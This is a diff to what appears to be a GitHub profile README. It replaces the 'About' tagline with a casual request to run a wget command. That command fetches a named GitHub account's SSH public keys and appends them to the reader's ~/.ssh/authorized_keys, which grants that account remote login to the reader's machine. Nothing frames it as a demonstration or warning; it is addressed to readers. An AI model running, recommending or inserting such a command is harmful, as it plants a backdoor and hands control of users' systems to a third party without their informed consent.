@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-🌍 Making the internet a better place, one pull request at a time.
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -21,4 +21,4 @@
 
 🕒 **Last Update**
 
-17-04-2025 16:22:29 UTC
+17-04-2025 20:19:13 UTC
